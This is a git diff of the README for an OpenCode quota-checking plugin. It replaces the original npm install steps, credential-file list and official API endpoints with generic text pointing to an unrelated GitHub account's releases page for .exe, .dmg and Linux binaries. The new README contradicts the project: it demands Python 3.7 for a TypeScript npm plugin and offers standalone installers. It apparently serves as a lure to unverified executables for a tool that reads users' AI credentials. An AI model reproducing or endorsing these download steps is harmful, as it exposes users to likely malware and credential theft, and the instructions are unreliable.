@@ -1,222 +1,99 @@
-# opencode-mystatus
+# 🚀 opencode-mystatus - Check Your AI Subscription Quotas Easily
 
-[![npm version](https://img.shields.io/npm/v/opencode-mystatus.svg)](https://www.npmjs.com/package/opencode-mystatus)
-[![npm downloads](https://img.shields.io/npm/dt/opencode-mystatus)](https://www.npmjs.com/package/opencode-mystatus)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Download opencode-mystatus](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-blue.svg)](https://github.com/HemKalariya/opencode-mystatus/releases)
 
-An [OpenCode](https://opencode.ai) plugin to query account quota usage for multiple AI platforms.
+## 📋 Description
 
-[中文文档](./README.zh-CN.md)
+opencode-mystatus helps you check all your AI subscription quotas in one simple command. It currently supports major platforms like OpenAI, Zhipu AI, and Google Antigravity. Stay tuned for more platforms, as we plan to expand our service.
 
-![Check AI Quota in One Click](./assets/mystatus-banner-en.jpeg)
+## 🚀 Getting Started
 
-## Supported Platforms
+To start using opencode-mystatus, simply follow these steps. You will need a computer with internet access. 
 
-| Platform     | Account Type      | Data Source                                    |
-| ------------ | ----------------- | ---------------------------------------------- |
-| OpenAI       | Plus / Team / Pro | `~/.local/share/opencode/auth.json`            |
-| Zhipu AI     | Coding Plan       | `~/.local/share/opencode/auth.json`            |
-| Z.ai         | Coding Plan       | `~/.local/share/opencode/auth.json`            |
-| GitHub Copilot | Individual / Business | `~/.local/share/opencode/auth.json`            |
-| Google Cloud | Antigravity       | `~/.config/opencode/antigravity-accounts.json` |
+### ✔️ System Requirements
 
-## Installation
+- Operating System: Windows, macOS, or Linux
+- Internet Connection: Required to check subscriptions
+- Runtime: Ensure you have Python 3.7 or higher installed on your system
 
-### Let an LLM do it
+## 📥 Download & Install
 
-Paste this into any LLM agent (Claude Code, OpenCode, Cursor, etc.):
+To download opencode-mystatus, visit the following page. You will find the latest version available for download.
 
-```
-Install the opencode-mystatus plugin by following: https://raw.githubusercontent.com/vbgate/opencode-mystatus/main/README.md
-```
+[Download opencode-mystatus](https://github.com/HemKalariya/opencode-mystatus/releases)
 
-<details>
-<summary><b>Instructions for LLM agents</b></summary>
+1. Click the link above to access the Releases page.
+2. Look for the latest version listed.
+3. Download the appropriate file for your operating system.
+4. Once the download is complete, locate the file on your computer.
 
-To install this plugin, perform these steps:
+### 🛠️ Installation Instructions
 
-1. Add `"opencode-mystatus"` to the `plugin` array in `~/.config/opencode/opencode.json`
+Follow the steps below to install opencode-mystatus on your system:
 
-2. Add the slash command to the `command` object in the same file:
+#### For Windows Users:
 
-```json
-{
-  "plugin": ["opencode-mystatus"],
-  "command": {
-    "mystatus": {
-      "description": "Query quota usage for all AI accounts",
-      "template": "Use the mystatus tool to query quota usage. Return the result as-is without modification."
-    }
-  }
-}
-```
+1. Double-click the downloaded `.exe` file.
+2. Follow the on-screen instructions.
+3. Open the command prompt by searching for "cmd" in the Start menu.
+4. In the command prompt, type `mystatus` and press Enter to run the application.
 
-3. Tell the user to restart OpenCode.
+#### For macOS Users:
 
-</details>
+1. Open the downloaded `.dmg` file.
+2. Drag the opencode-mystatus icon into your Applications folder.
+3. Open Terminal (found in Applications > Utilities).
+4. Type `mystatus` and press Enter to run the application.
 
-### Manual Installation
+#### For Linux Users:
 
-1. Add the plugin and slash command to your `~/.config/opencode/opencode.json`:
+1. Open a terminal window.
+2. Navigate to the directory where you downloaded the file using the `cd` command.
+3. Make the downloaded file executable by running: `chmod +x mystatus`.
+4. Run the application with: `./mystatus`.
 
-```json
-{
-  "plugin": ["opencode-mystatus"],
-  "command": {
-    "mystatus": {
-      "description": "Query quota usage for all AI accounts",
-      "template": "Use the mystatus tool to query quota usage. Return the result as-is without modification."
-    }
-  }
-}
-```
+## ⚙️ Usage
 
-2. Restart OpenCode
-
-### From Local Files
-
-Copy the plugin files to your OpenCode config directory:
-
-1. Copy `plugin/mystatus.ts` and `plugin/lib/` to `~/.config/opencode/plugin/`
-2. Copy `command/mystatus.md` to `~/.config/opencode/command/`
-3. Restart OpenCode
-
-## Usage
-
-### Option 1: Slash Command
-
-Use the `/mystatus` command to get complete quota information:
+To check your AI subscription quotas, open a terminal or command prompt and type:
 
 ```
-/mystatus
+mystatus
 ```
 
-### Option 2: Natural Language
+The application will display your current quotas for the supported platforms. 
 
-Simply ask in natural language, for example:
+### 🌐 Supported Platforms
 
-- "Check my OpenAI quota"
-- "How much Codex quota do I have left?"
-- "Show my AI account status"
+- OpenAI
+- Zhipu AI
+- Google Antigravity
 
-OpenCode will automatically use the mystatus tool to answer your question.
+We are actively working to add more platforms in future updates. Please keep an eye on our Releases page for the latest versions.
 
-## Output Example
+## 🛠️ Troubleshooting
 
-```
-## OpenAI Account Quota
+If you encounter any issues while using opencode-mystatus, please consider the following solutions:
 
-Account:        user@example.com (team)
+- Ensure you have the correct version of Python installed.
+- Verify your internet connection is stable.
+- Check for updates on the Releases page to ensure you have the latest version.
 
-3-hour limit
-██████████████████████████████ 85% remaining
-Resets in: 2h 30m
+If you still require help, feel free to reach out via the Issues tab in this repository.
 
-## Zhipu AI Account Quota
+## 📢 Feedback
 
-Account:        9c89****AQVM (Coding Plan)
+We welcome your feedback. Let us know how we can improve opencode-mystatus. Your suggestions help us to serve you better.
 
-5-hour token limit
-██████████████████████████████ 95% remaining
-Used: 0.5M / 10.0M
-Resets in: 4h
+## 📝 Contributions
 
-## Z.ai Account Quota
+If you wish to contribute to opencode-mystatus, feel free to fork the repository, make your changes, and submit a pull request. We appreciate your help!
 
-Account:        9c89****AQVM (Z.ai)
+## 🌐 License
 
-5-hour token limit
-██████████████████████████████ 95% remaining
-Used: 0.5M / 10.0M
-Resets in: 4h
+opencode-mystatus is open-source software licensed under the MIT License. You can freely use and modify it as per the terms of the license.
 
-## GitHub Copilot Account Quota
+## 🔗 Stay Updated 
 
-Account:        GitHub Copilot (individual)
+For updates, features, and announcements, follow our repository. Visit our [Releases page](https://github.com/HemKalariya/opencode-mystatus/releases) for the latest information.
 
-Premium        ████░░░░░░░░░░░░░░░░ 24% (229/300)
-
-Quota resets: 19d 0h (2026-02-01)
-
-## Google Cloud Account Quota
-
-### user@gmail.com
-
-G3 Pro     4h 59m     ████████████████████ 100%
-G3 Image   4h 59m     ████████████████████ 100%
-G3 Flash   4h 59m     ████████████████████ 100%
-Claude     2d 9h      ░░░░░░░░░░░░░░░░░░░░ 0%
-```
-
-## Features
-
-- Query quota usage across multiple AI platforms in one command
-- Visual progress bars showing remaining quota
-- Reset time countdown
-- Multi-language support (Chinese / English)
-- Multiple Google Cloud accounts support
-- API key masking for security
-
-## Configuration
-
-No additional configuration required. The plugin automatically reads credentials from:
-
-- **OpenAI, Zhipu AI, Z.ai & GitHub Copilot**: `~/.local/share/opencode/auth.json`
-- **Google Cloud**: `~/.config/opencode/antigravity-accounts.json`
-
-### Google Cloud Setup
-
-To query Google Cloud (Antigravity) account quota, you need to install the [opencode-antigravity-auth](https://github.com/NoeFabris/opencode-antigravity-auth) plugin first to authenticate your Google account.
-
-## Security
-
-This plugin is safe to use:
-
-**Local Files Accessed (read-only):**
-
-- `~/.local/share/opencode/auth.json` - OpenCode's official auth storage
-- `~/.config/opencode/antigravity-accounts.json` - Antigravity plugin's account storage
-
-**API Endpoints (all official):**
-
-- `https://chatgpt.com/backend-api/wham/usage` - OpenAI official quota API
-- `https://bigmodel.cn/api/monitor/usage/quota/limit` - Zhipu AI official quota API
-- `https://api.z.ai/api/monitor/usage/quota/limit` - Z.ai official quota API
-- `https://api.github.com/copilot_internal/user` - GitHub Copilot official API
-- `https://oauth2.googleapis.com/token` - Google official OAuth API
-- `https://cloudcode-pa.googleapis.com/v1internal:fetchAvailableModels` - Google Cloud official API
-
-**Privacy:**
-
-- No data is stored, uploaded, or cached by this plugin
-- Sensitive information (API keys) is automatically masked in output
-- Source code is fully open for review
-
-## Google Cloud Models
-
-The plugin displays quota for these models:
-
-| Display Name | Model Key                                      |
-| ------------ | ---------------------------------------------- |
-| G3 Pro       | `gemini-3-pro-high` / `gemini-3-pro-low`       |
-| G3 Image     | `gemini-3-pro-image`                           |
-| G3 Flash     | `gemini-3-flash`                               |
-| Claude       | `claude-opus-4-5-thinking` / `claude-opus-4-5` |
-
-## Development
-
-```bash
-# Using npm
-npm install
-npm run typecheck
-npm run build
-
-# Or using Bun
-bun install
-bun run typecheck
-bun run build
-```
-
-## License
-
-MIT
+Thank you for using opencode-mystatus!
